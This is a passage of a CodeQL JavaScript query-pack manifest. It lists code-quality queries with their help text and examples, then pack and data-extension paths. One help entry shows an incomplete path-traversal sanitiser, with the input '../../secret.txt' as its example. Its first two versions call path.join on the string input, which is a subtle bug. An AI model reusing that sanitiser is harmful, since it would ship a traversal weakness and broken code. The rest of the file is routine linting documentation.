      \ `void 0`) rather than using a return statement without an explicit return value.\n\
      \n\n## Recommendation\nReplace implicit return statements with return statements\
      \ explicitly returning `undefined` or `void 0` or a similar expression.\n\n\n\
      ## Example\nIn the following example, the function `solve_quad` computes one of\
      \ the roots of a quadratic equation given by the coefficients `a`, `b` and `c`.\
      \ In cases where there are no roots, it returns `undefined` by means of the implicit\
      \ return statement on line 3.\n\n\n```javascript\nfunction solve_quad(a, b, c)\
      \ {\n\tif (a === 0 || b*b < 4*a*c)\n\t\treturn;\n\treturn (-b + Math.sqrt(b*b\
      \ - 4*a*c))/(2*a);\n}\n```\nIt would be clearer to make this exceptional return\
      \ value explicit as follows:\n\n\n```javascript\nfunction solve_quad(a, b, c)\
      \ {\n\tif (a === 0 || b*b < 4*a*c)\n\t\treturn void 0;\n\treturn (-b + Math.sqrt(b*b\
      \ - 4*a*c))/(2*a);\n}\n```\n\n## References\n* Mozilla Developer Network: [Return](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/return).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/LabelInCase.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/LabelInCase.bqrs
    metadata:
      name: Non-case label in switch statement
      description: |-
        A non-case label appearing in a switch statement that is textually aligned with a case
                      label is confusing to read, or may even indicate a bug.
      kind: problem
      problem.severity: warning
      id: js/label-in-switch
      tags: |-
        quality
               reliability
               correctness
      precision: very-high
    queryHelp:
      "# Non-case label in switch statement\nJavaScript allows to freely mix\
      \ `case` labels and ordinary statement labels in the body of a `switch` statement.\
      \ However, this is confusing to read (especially if both kinds of labels have\
      \ the same amount of indentation), and indeed most likely the result of a typo.\n\
      \n\n## Recommendation\nExamine the statement labels to see whether they were meant\
      \ to be case labels. If not, consider wrapping them into a statement block and\
      \ indent them to set them apart visually from the case labels.\n\n\n## Example\n\
      In this example, the label `case3` is most likely a typo for `case 3` and should\
      \ be fixed.\n\n\n```javascript\nfunction f(x) {\n\tswitch (x) {\n\tcase 1:\n\t\
      case 2:\n\tcase3:\n\t\treturn true;\n\tdefault:\n\t\treturn false;\n\t}\n}\n```\n\
      \n## References\n* Ecma International, *ECMAScript Language Definition*, 5.1 Edition,\
      \ Section 12.11. ECMA, 2011.\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/LoopIterationSkippedDueToShifting.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/LoopIterationSkippedDueToShifting.bqrs
    metadata:
      name: Loop iteration skipped due to shifting
      description: |-
        Removing elements from an array while iterating over it can cause the loop to skip over some elements,
                      unless the loop index is decremented accordingly.
      kind: problem
      problem.severity: warning
      id: js/loop-iteration-skipped-due-to-shifting
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp: |
      # Loop iteration skipped due to shifting
      Items can be removed from an array using the `splice` method, but when doing so, all subsequent items will be shifted to a lower index. If this is done while iterating over the array, the shifting may cause the loop to skip over the element immediately after the removed element.


      ## Recommendation
      Determine what the loop is supposed to do:

      * If the intention is to remove *every occurrence* of a certain value, decrement the loop counter after removing an element, to counterbalance the shift.
      * If the loop is only intended to remove *a single value* from the array, consider adding a `break` after the `splice` call.
      * If the loop is deliberately skipping over elements, consider moving the index increment into the body of the loop, so it is clear that the loop is not a trivial array iteration loop.

      ## Example
      In this example, a function is intended to remove "`..`" parts from a path:


      ```javascript
      function removePathTraversal(path) {
        let parts = path.split('/');
        for (let i = 0; i < parts.length; ++i) {
          if (parts[i] === '..') {
            parts.splice(i, 1);
          }
        }
        return path.join('/');
      }

      ```
      However, whenever the input contain two "`..`" parts right after one another, only the first will be removed. For example, the string "`../../secret.txt`" will be mapped to "`../secret.txt`". After removing the element at index 0, the loop counter is incremented to 1, but the second "`..`" string has now been shifted down to index 0 and will therefore be skipped.

      One way to avoid this is to decrement the loop counter after removing an element from the array:


      ```javascript
      function removePathTraversal(path) {
        let parts = path.split('/');
        for (let i = 0; i < parts.length; ++i) {
          if (parts[i] === '..') {
            parts.splice(i, 1);
            --i; // adjust for array shift
          }
        }
        return path.join('/');
      }

      ```
      Alternatively, use the `filter` method:


      ```javascript
      function removePathTraversal(path) {
        return path.split('/').filter(part => part !== '..').join('/');
      }

      ```

      ## References
      * MDN: [Array.prototype.splice()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/splice).
      * MDN: [Array.prototype.filter()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/MisleadingIndentationAfterControlStmt.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/MisleadingIndentationAfterControlStmt.bqrs
    metadata:
      name: Misleading indentation after control statement
      description: |-
        The body of a control statement should have appropriate indentation to clarify which
                      statements it controls and which ones it does not control.
      kind: problem
      problem.severity: warning
      id: js/misleading-indentation-after-control-statement
      tags: |-
        quality
               maintainability
               readability
               statistical
               non-attributable
               external/cwe/cwe-483
      precision: very-high
    queryHelp:
      "# Misleading indentation after control statement\nLoop bodies and the\
      \ 'then' and 'else' branches of `if` statements can either be block statements\
      \ delimited by curly braces, or simple statements. In the latter case, special\
      \ care must be taken to correctly indent statements to indicate whether or not\
      \ they belong to the body of the loop or the `if` statement. In particular, the\
      \ statement immediately after the loop or `if` statement should not be indented\
      \ by the same amount as the body to avoid misunderstanding of the control flow\
      \ structure.\n\n\n## Recommendation\nUse additional indentation to set loop bodies\
      \ and then/else branches apart, but use the same amount of indentation for statements\
      \ that follow each other in a sequence of statements.\n\n\n## Example\nIn this\
      \ example, the 'then' branch of the `if` statement consists of the single statement\
      \ `scream();`. Indentation makes it appear as if the statement `runAway();` also\
      \ belongs to the 'then' branch, while in fact it does not: it is simply the next\
      \ statement after the `if`, and will be executed regardless of whether the condition\
      \ `afraid()` evaluates to true or false.\n\n\n```javascript\nif (afraid())\n\t\
      scream();\n\trunAway();\n```\nIf both statements were intended to be part of the\
      \ 'then' branch, they should be enclosed in a block of statements like this:\n\
      \n\n```javascript\nif (afraid()) {\n\tscream();\n\trunAway();\n}\n```\nIf the\
      \ second statement does not logically belong in the 'then' branch, its indentation\
      \ should be decreased like this:\n\n\n```javascript\nif (afraid())\n\tscream();\n\
      runAway();\n```\n\n## References\n* Tutorialzine: [10 Mistakes That JavaScript\
      \ Beginners Often Make](http://tutorialzine.com/2014/04/10-mistakes-javascript-beginners-make/).\n\
      * Common Weakness Enumeration: [CWE-483](https://cwe.mitre.org/data/definitions/483.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/NestedLoopsSameVariable.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/NestedLoopsSameVariable.bqrs
    metadata:
      name: Nested loops with same variable
      description: |-
        Nested loops in which the iteration variable is the same for each loop are difficult
                      to understand.
      kind: problem
      problem.severity: warning
      id: js/nested-loops-with-same-variable
      tags: |-
        maintainability
               correctness
      precision: low
    queryHelp:
      "# Nested loops with same variable\nNested 'for' loops with the same\
      \ iteration variable are hard to understand, since the inner loop affects the\
      \ iteration variable of the outer loop. Sometimes this behavior is unintended\
      \ and indicates a bug.\n\n\n## Recommendation\nUse different iteration variables\
      \ in both loops.\n\n\n## Example\nIn this example, the outer loop iterates `i`\
      \ from 0 to 10. The inner loop initializes `j` to the value of `i`, and then iterates\
      \ it down to 5. Hence, the outer loop will never terminate since the inner loop\
      \ prevents its iteration variable from reaching 10.\n\n\n```javascript\nfor (var\
      \ i=0; i<10; ++i) {\n\t// NOT OK\n\tfor (var j=i; i>5; --i)\n\t\tf(i, j);\n}\n\
      ```\nMost likely, the loop condition `i>5` of the inner loop is a typo for `j>5`,\
      \ and similarly the update expression `--i` should be `--j`:\n\n\n```javascript\n\
      for (var i=0; i<10; ++i) {\n\t// NOT OK\n\tfor (var j=i; j>5; --j)\n\t\tf(i, j);\n\
      }\n```\n\n## References\n* Ecma International, *ECMAScript Language Definition*,\
      \ 5.1 Edition, Section 12.6.3. ECMA, 2011.\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/ReturnAssignsLocal.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/ReturnAssignsLocal.bqrs
    metadata:
      name: Return statement assigns local variable
      description: |-
        An assignment to a local variable in a return statement is useless, since the variable will
                      immediately go out of scope and its value is lost.
      kind: problem
      problem.severity: warning
      id: js/useless-assignment-in-return
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-563
      precision: very-high
    queryHelp:
      "# Return statement assigns local variable\nAssigning a local variable\
      \ in a return statement is useless, since the local variable will go out of scope\
      \ immediately and its new value is lost.\n\n\n## Recommendation\nClosely examine\
      \ the code in question to understand the original intention. For instance, the\
      \ assignment may originally have referred to a variable from another scope that\
      \ accidentally was shadowed due to a renaming; in this case, perform another renaming\
      \ to make it visible again. Or maybe the assignment was meant to assign to a property\
      \ of the receiver object and the programmer inadvertently forgot to qualify it\
      \ by `this`; address this by providing the required qualification. Finally, the\
      \ assignment may simply be unnecessary, in which case it can be removed.\n\n\n\
      ## Example\nIn the following example, the `getName` method of `Person` contains\
      \ a useless assignment to `name`.\n\n\n```javascript\nfunction Person(first, last,\
      \ age) {\n\tthis.first = first;\n\tthis.last = last;\n\tthis.age = age;\n}\n\n\
      Person.prototype.getName = function() {\n\tvar name = first + \" \" + last;\n\t\
      return name = name.trim();\n};\n```\nThe assignment serves no obvious purpose\
      \ and should be removed:\n\n\n```javascript\nfunction Person(first, last, age)\
      \ {\n\tthis.first = first;\n\tthis.last = last;\n\tthis.age = age;\n}\n\nPerson.prototype.getName\
      \ = function() {\n\tvar name = first + \" \" + last;\n\treturn name.trim();\n\
      };\n```\n\n## References\n* Wikipedia: [Dead store](https://en.wikipedia.org/wiki/Dead_store).\n\
      * Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/ReturnOutsideFunction.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/ReturnOutsideFunction.bqrs
    metadata:
      name: Return statement outside function
      description: |-
        A 'return' statement appearing outside a function will cause an error
                      when it is executed.
      kind: problem
      problem.severity: warning
      id: js/return-outside-function
      tags: |-
        reliability
               correctness
      precision: low
    queryHelp: |
      # Return statement outside function
      In JavaScript, `return` statements are not allowed outside functions in most cases, the main exception being event handler code in HTML attributes. On the other hand, `return` is not allowed in `javascript:` URLs, and will cause a runtime exception on many browsers.


      ## Recommendation
      Investigate the code to see whether the `return` statement should be nested in a function.


      ## Example
      In the following HTML snippet, a developer has implemented a function `validateForm` that should be invoked when the form is submitted to check its contents for wellformedness, and prevent submission if validation fails. The developer attempts to achieve this by invoking `validateForm` through a `javascript:` URL in the form's `action` attribute:


      ```html
      <form name="f" action="javascript:return validateForm(this);" method="post">
          <!--  form contents -->
      </form>
      ```
      This will not work in practice, since the `return` causes a syntax error. Instead, the validation should be moved to the `onsubmit` event handler, where a `return` statement is legal:


      ```html
      <form name="f" onsubmit="return validateForm(this);" method="post">
          <!--  form contents -->
      </form>
      ```

      ## References
      * Mozilla Developer Network: [Return](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/return).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/SuspiciousUnusedLoopIterationVariable.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/SuspiciousUnusedLoopIterationVariable.bqrs
    metadata:
      name: Unused loop iteration variable
      description: 'A loop iteration variable is unused, which suggests an error.'
      kind: problem
      problem.severity: error
      id: js/unused-loop-variable
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp:
      "# Unused loop iteration variable\nMost `for...in` and `for...of` statements\
      \ use their iteration variable in the loop body, unless they simply count the\
      \ number of iterations by incrementing a loop counter in the loop body, or check\
      \ whether the loop body is executed at all. Loops that do not use their iteration\
      \ variable but do not fall into one of these two categories may indicate a logic\
      \ error or typo.\n\n\n## Recommendation\nCarefully check whether the loop variable\
      \ should be used. If the variable is genuinely not being used and the code is\
      \ correct, consider renaming the variable to `_` or `unused` to indicate to readers\
      \ of the code that it is intentionally unused.\n\n\n## Example\nIn this example,\
      \ the `for...of` loop iteration variable `x` is never used. It appears that the\
      \ function is intended to count how many elements of the array `xs` satisfy the\
      \ filter predicate `p`, but the programmer forgot to actually pass `x` as an argument\
      \ to `p`.\n\n\n```javascript\nfunction countOccurrences(xs, p) {\n\tvar count\
      \ = 0;\n\tfor (let x of xs)\n\t\tif (p())\n\t\t\t++count;\n\treturn count;\n}\n\
      ```\nTo fix this issue, the call `p()` should be replaced by `p(x)`.\n\n\n## References\n\
      * Mozilla Developer Network: [for...in](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...in).\n\
      * Mozilla Developer Network: [for...of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/UnreachableStatement.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/UnreachableStatement.bqrs
    metadata:
      name: Unreachable statement
      description:
        Unreachable statements are often indicative of missing code or latent
        bugs and should be avoided.
      kind: problem
      problem.severity: warning
      id: js/unreachable-statement
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-561
      precision: very-high
    queryHelp:
      "# Unreachable statement\nAn unreachable statement almost always indicates\
      \ missing code or a latent bug and should be examined carefully.\n\n\n## Recommendation\n\
      Examine the surrounding code to determine why the statement has become unreachable.\
      \ If it is no longer needed, remove the statement.\n\n\n## Example\nIn the following\
      \ example, a spurious semicolon after the `if` condition at line 2 makes the `return`\
      \ statement on line 4 unreachable: the function will always execute the `return`\
      \ statement on line 3 first, so it will never reach line 4.\n\n\n```javascript\n\
      function f() {\n\tif (someCond());\n\t\treturn 23;\n\treturn 42;\n}\n```\nTo correct\
      \ this issue, remove the spurious semicolon:\n\n\n```javascript\nfunction f()\
      \ {\n\tif (someCond())\n\t\treturn 23;\n\treturn 42;\n}\n```\n\n## References\n\
      * Wikipedia: [Unreachable code](http://en.wikipedia.org/wiki/Unreachable_code).\n\
      * Common Weakness Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/UselessComparisonTest.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/UselessComparisonTest.bqrs
    metadata:
      name: Useless comparison test
      description: |-
        A comparison that always evaluates to true or always evaluates to false may
                      indicate faulty logic and dead code.
      kind: problem
      problem.severity: warning
      id: js/useless-comparison-test
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp: |
      # Useless comparison test
      If a condition always evaluates to true or always evaluates to false, this often indicates incomplete code or a latent bug, and it should be examined carefully.


      ## Recommendation
      Examine the surrounding code to determine why the condition is redundant. If it is no longer needed, remove it.

      If the check is needed to guard against `NaN` values, insert a comment explaining the possibility of `NaN`.


      ## Example
      The following example finds the index of an element in a given slice of the array:


      ```javascript
      function findValue(values, x, start, end) {
        let i;
        for (i = start; i < end; ++i) {
          if (values[i] === x) {
              return i;
          }
        }
        if (i < end) {
          return i;
        }
        return -1;
      }

      ```
      The condition `i < end` at the end is always false, however. The code can be clarified if the redundant condition is removed:


      ```javascript
      function findValue(values, x, start, end) {
        for (let i = start; i < end; ++i) {
          if (values[i] === x) {
              return i;
          }
        }
        return -1;
      }

      ```

      ## References
      * Mozilla Developer Network: [Truthy](https://developer.mozilla.org/en-US/docs/Glossary/Truthy), [Falsy](https://developer.mozilla.org/en-US/docs/Glossary/Falsy).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/UselessConditional.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/UselessConditional.bqrs
    metadata:
      name: Useless conditional
      description: |-
        If a conditional expression always evaluates to true or always
                      evaluates to false, this suggests incomplete code or a logic
                      error.
      kind: problem
      problem.severity: warning
      id: js/trivial-conditional
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-570
               external/cwe/cwe-571
      precision: very-high
    queryHelp: |
      # Useless conditional
      If a condition always evaluates to true or always evaluates to false, this often indicates incomplete code or a latent bug and should be examined carefully.


      ## Recommendation
      Examine the surrounding code to determine why the condition is useless. If it is no longer needed, remove it.


      ## Example
      The following example constructs an array `lines`, and then attempts to check whether it has any elements by means of an if conditional `if (!lines)`.


      ```javascript
      function getLastLine(input) {
        var lines = [], nextLine;
        while ((nextLine = readNextLine(input)))
          lines.push(nextLine);
        if (!lines)
          throw new Error("No lines!");
        return lines[lines.length-1];
      }
      ```
      Note that in JavaScript (unlike some other languages) arrays and objects are always considered to be true when evaluated in a Boolean context. The code should instead check `lines.length`:


      ```javascript
      function getLastLine(input) {
        var lines = [], nextLine;
        while ((nextLine = readNextLine(input)))
          lines.push(nextLine);
        if (!lines.length)
          throw new Error("No lines!");
        return lines[lines.length-1];
      }
      ```

      ## References
      * Mozilla Developer Network: [Truthy](https://developer.mozilla.org/en-US/docs/Glossary/Truthy), [Falsy](https://developer.mozilla.org/en-US/docs/Glossary/Falsy).
      * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).
      * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/UseOfReturnlessFunction.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/UseOfReturnlessFunction.bqrs
    metadata:
      name: Use of returnless function
      description:
        Using the return value of a function that does not return an expression
        is indicative of a mistake.
      kind: problem
      problem.severity: warning
      id: js/use-of-returnless-function
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp: |
      # Use of returnless function
      JavaScript functions that do not return an expression will implicitly return `undefined`. Using the implicit return value from such a function is not an error in itself, but it is a pattern indicating that some misunderstanding has occurred.


      ## Recommendation
      Do not use the return value from a function that does not return an expression.


      ## Example
      In the example below, the function `renderText` is used to render text through side effects, and the function does not return an expression. However, the programmer still uses the return value from `renderText` as if the function returned an expression, which is clearly an error.


      ```javascript
      var stage = require("./stage")

      function renderText(text, id) {
          document.getElementById(id).innerText = text;
      }

      var text = renderText("Two households, both alike in dignity", "scene");

      stage.show(text);
      ```
      The program can be fixed either by removing the use of the value returned by `renderText`, or by changing the `renderText` function to return an expression.


      ## References
      * Mozilla Developer Network: [Return](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/return).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Summary/LinesOfCode.ql
    relativeBqrsPath: codeql/javascript-queries/Summary/LinesOfCode.bqrs
    metadata:
      id: js/summary/lines-of-code
      name: Total lines of JavaScript and TypeScript code in the database
      description:
        "The total number of lines of JavaScript or TypeScript code across\
        \ all files checked into the repository, except in `node_modules`. This is a\
        \ useful metric of the size of a database. For all files that were seen during\
        \ extraction, this query counts the lines of code, excluding whitespace or comments."
      kind: metric
      tags: |-
        summary
               telemetry
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Summary/LinesOfUserCode.ql
    relativeBqrsPath: codeql/javascript-queries/Summary/LinesOfUserCode.bqrs
    metadata:
      name: Total lines of user written JavaScript and TypeScript code in the database
      description: |-
        The total number of lines of JavaScript and TypeScript code from the source code directory,
           excluding auto-generated files and files in `node_modules`. This query counts the lines of code, excluding
           whitespace or comments.
      kind: metric
      tags: |-
        summary
               lines-of-code
               debug
      id: js/summary/lines-of-user-code
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Summary/TaintSinks.ql
    relativeBqrsPath: codeql/javascript-queries/Summary/TaintSinks.bqrs
    metadata:
      name: Taint sinks
      description: Expressions that are vulnerable if containing untrusted data.
      kind: problem
      problem.severity: info
      id: js/summary/taint-sinks
      tags: summary
      precision: medium
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Summary/TaintSources.ql
    relativeBqrsPath: codeql/javascript-queries/Summary/TaintSources.bqrs
    metadata:
      name: Taint sources
      description: Sources of untrusted input.
      kind: problem
      problem.severity: info
      id: js/summary/taint-sources
      tags: summary
      precision: medium
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Vue/ArrowMethodOnVueInstance.ql
    relativeBqrsPath: codeql/javascript-queries/Vue/ArrowMethodOnVueInstance.bqrs
    metadata:
      name: Arrow method on Vue instance
      description:
        An arrow method on a Vue instance doesn't have its `this` variable
        bound to the Vue instance.
      kind: problem
      problem.severity: warning
      id: js/vue/arrow-method-on-vue-instance
      tags: |-
        quality
               reliability
               correctness
               frameworks/vue
      precision: high
    queryHelp: |
      # Arrow method on Vue instance
      The Vue framework invokes the methods of a Vue instance with the instance as the receiver. It is however impossible to perform this binding of instance and receiver for arrow functions, so the `this` variable in an arrow function on a Vue instance may not have the value that the programmer expects.


      ## Recommendation
      Ensure that the methods on a Vue instance can have their receiver bound to the instance.


      ## Example
      The following example shows two similar Vue instances, the only difference is how the `created` life cycle hook callback is defined. The first Vue instance uses an arrow function as the callback. This means that the `this` variable will have the global object as its value, causing `this.myProperty` to evaluate to `undefined`, which may not be intended. Instead, the second Vue instance uses an ordinary function as the callback, causing `this.myProperty` to evaluate to `42`.


      ```javascript
      new Vue({
        data: {
          myProperty: 42
        },
        created: () => {
          // BAD: prints: "myProperty is: undefined"
          console.log('myProperty is: ' + this.myProperty);
        }
      });

      new Vue({
        data: {
          myProperty: 42
        },
        created: function () {
          // GOOD: prints: "myProperty is: 1"
          console.log('myProperty is: ' + this.myProperty);
        }
      });

      ```

      ## References
      * Vue documentation: [The Vue Instance](https://vuejs.org/v2/guide/instance.html)
extensionPacks: []
packs:
  codeql/javascript-all#1:
    name: codeql/javascript-all
    version: 2.6.10
    isLibrary: true
    isExtensionPack: false
    localPath: file:///D:/Import-Manager/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/javascript-all/2.6.10/
    localPackDefinitionFile: file:///D:/Import-Manager/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/javascript-all/2.6.10/qlpack.yml
    headSha: 28f02c07d7d744d761520fbfb354f96827a11f6c
    runDataExtensions: []
  codeql/threat-models#2:
    name: codeql/threat-models
    version: 1.0.30
    isLibrary: true
    isExtensionPack: false
    localPath: file:///D:/Import-Manager/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/threat-models/1.0.30/
    localPackDefinitionFile: file:///D:/Import-Manager/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/threat-models/1.0.30/qlpack.yml
    headSha: 28f02c07d7d744d761520fbfb354f96827a11f6c
    runDataExtensions: []
  codeql/javascript-queries#0:
    name: codeql/javascript-queries
    version: 2.0.3
    isLibrary: false
    isExtensionPack: false
    localPath: file:///D:/Import-Manager/codeql/javascript-queries/2.0.3/
    localPackDefinitionFile: file:///D:/Import-Manager/codeql/javascript-queries/2.0.3/qlpack.yml
    headSha: 28f02c07d7d744d761520fbfb354f96827a11f6c
    runDataExtensions:
      - pack: codeql/javascript-all#1
        relativePath: ext/apollo-server.model.yml
        index: 0
        firstRowId: 0
        rowCount: 1
        locations:
          lineNumbers: A=6
          columnNumbers: A=9
      - pack: codeql/javascript-all#1
        relativePath: ext/apollo-server.model.yml
        index: 1
        firstRowId: 1
        rowCount: 4
        locations:
          lineNumbers: A=12+1*3
          columnNumbers: A=9*4
      - pack: codeql/javascript-all#1
        relativePath: ext/aws-sdk.model.yml
        index: 0
        firstRowId: 5
        rowCount: 3
        locations:
          lineNumbers: A=6+1*2
          columnNumbers: A=7*3
      - pack: codeql/javascript-all#1
        relativePath: ext/axios.model.yml
        index: 0
        firstRowId: 8
        rowCount: 1
        locations:
          lineNumbers: A=6
          columnNumbers: A=9
      - pack: codeql/javascript-all#1
        relativePath: ext/axios.model.yml
        index: 1
        firstRowId: 9
        rowCount: 1
        locations:
          lineNumbers: A=12
          columnNumbers: A=9
      - pack: codeql/javascript-all#1
        relativePath: ext/default-threat-models-fixup.model.yml
        index: 0
        firstRowId: 10
        rowCount: 1
        locations:
          lineNumbers: A=8
          columnNumbers: A=9
      - pack: codeql/javascript-all#1
        relativePath: ext/hana-db-client.model.yml
        index: 0
        firstRowId: 11
        rowCount: 4
        locations:
          lineNumbers: A=6+1*3
          columnNumbers: A=9*4
      - pack: codeql/javascript-all#1
        relativePath: ext/hana-db-client.model.yml
        index: 1
        firstRowId: 15
        rowCount: 2
        locations:
          lineNumbers: A=15+1
          columnNumbers: A=9*2
      - pack: codeql/javascript-all#1
        relativePath: ext/hana-db-client.model.yml
        index: 2
        firstRowId: 17
        rowCount: 6
        locations:
          lineNumbers: A=22+1*5
          columnNumbers: A=9*6
      - pack: codeql/javascript-all#1
        relativePath: ext/make-dir.model.yml
        index: 0
        firstRowId: 23
        rowCount: 1
        locations:
          lineNumbers: A=6
          columnNumbers: A=9
      - pack: codeql/javascript-all#1
        relativePath: ext/markdown-table.model.yml
        index: 0
        firstRowId: 24
        rowCount: 1
        locations:
          lineNumbers: A=6
          columnNumbers: A=9
      - pack: codeql/javascript-all#1
        relativePath: ext/mkdirp.model.yml
        index: 0
        firstRowId: 25
        rowCount: 2
        locations:
          lineNumbers: A=6+1
          columnNumbers: A=9*2
      - pack: codeql/javascript-all#1
        relativePath: ext/open.model.yml
        index: 0
        firstRowId: 27
        rowCount: 2
        locations:
          lineNumbers: A=6+1
          columnNumbers: A=9*2
      - pack: codeql/javascript-all#1
        relativePath: ext/react-relay-threat.model.yml
        index: 0
        firstRowId: 29
        rowCount: 10
        locations:
          lineNumbers: A=6+1*9
          columnNumbers: A=9*10
      - pack: codeql/javascript-all#1
        relativePath: ext/react.model.yml
        index: 0
        firstRowId: 39
        rowCount: 1
        locations:
          lineNumbers: A=6
          columnNumbers: A=9
      - pack: codeql/javascript-all#1
        relativePath: ext/rimraf.model.yml
        index: 0
        firstRowId: 40
        rowCount: 3
        locations:
          lineNumbers: A=6+1*2
          columnNumbers: A=9*3
      - pack: codeql/javascript-all#1
        relativePath: ext/shelljs.model.yml
        index: 0
        firstRowId: 43
        rowCount: 1
        locations:
          lineNumbers: A=6
          columnNumbers: A=9
      - pack: codeql/javascript-all#1
        relativePath: ext/tanstack.model.yml
        index: 0
        firstRowId: 44
        rowCount: 6
        locations:
          lineNumbers: A=6+1*5
          columnNumbers: A=9*6
      - pack: codeql/javascript-all#1
        relativePath: ext/underscore.string.model.yml
        index: 0
        firstRowId: 50
        rowCount: 5
        locations:
          lineNumbers: A=6+1*4
          columnNumbers: A=9*5
      - pack: codeql/javascript-all#1
        relativePath: ext/underscore.string.model.yml
        index: 1
        firstRowId: 55
        rowCount: 20
        locations:
          lineNumbers: A=16+1*19
          columnNumbers: A=9*20
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/NoSQL.model.yml
        index: 0
        firstRowId: 75
        rowCount: 4
        locations:
          lineNumbers: A=8+3+1*2
          columnNumbers: A=9*4
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/NodeJSLib.model.yml
        index: 0
        firstRowId: 79
        rowCount: 5
        locations:
          lineNumbers: A=6+1*4
          columnNumbers: A=9*5
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/SQL.model.yml
        index: 0
        firstRowId: 84
        rowCount: 5
        locations:
          lineNumbers: A=6+1*4
          columnNumbers: A=9*5
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/SQL.model.yml
        index: 1
        firstRowId: 89
        rowCount: 4
        locations:
          lineNumbers: A=16+1*3
          columnNumbers: A=9*4
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/helmet/Helmet.Required.Setting.model.yml
        index: 0
        firstRowId: 93
        rowCount: 2
        locations:
          lineNumbers: A=6+1
          columnNumbers: A=9*2
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/minimongo/model.yml
        index: 0
        firstRowId: 95
        rowCount: 75
        locations:
          lineNumbers: A=6+1*74
          columnNumbers: A=9*75
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/mongodb/model.yml
        index: 0
        firstRowId: 170
        rowCount: 26
        locations:
          lineNumbers: A=6+1*25
          columnNumbers: A=9*26
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/mongodb/model.yml
        index: 1
        firstRowId: 196
        rowCount: 611
        locations:
          lineNumbers: A=37+1*610
          columnNumbers: A=9*611
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/mongodb/model.yml
        index: 2
        firstRowId: 807
        rowCount: 32
        locations:
          lineNumbers: A=653+1*31
          columnNumbers: A=9*32
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/mongodb/model.yml
        index: 3
        firstRowId: 839
        rowCount: 102
        locations:
          lineNumbers: A=690+1*101
          columnNumbers: A=9*102
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/mssql/model.yml
        index: 0
        firstRowId: 941
        rowCount: 34
        locations:
          lineNumbers: A=6+1*33
          columnNumbers: A=9*34
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/mysql/model.yml
        index: 0
        firstRowId: 975
        rowCount: 57
        locations:
          lineNumbers: A=6+1*56
          columnNumbers: A=9*57
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/mysql/model.yml
        index: 1
        firstRowId: 1032
        rowCount: 3
        locations:
          lineNumbers: A=68+1*2
          columnNumbers: A=9*3
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/pg/model.yml
        index: 0
        firstRowId: 1035
        rowCount: 65
        locations:
          lineNumbers: A=6+1*64
          columnNumbers: A=9*65
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/pg/model.yml
        index: 1
        firstRowId: 1100
        rowCount: 5
        locations:
          lineNumbers: A=76+1*4
          columnNumbers: A=9*5
      - pack: codeql/javascript-all#1
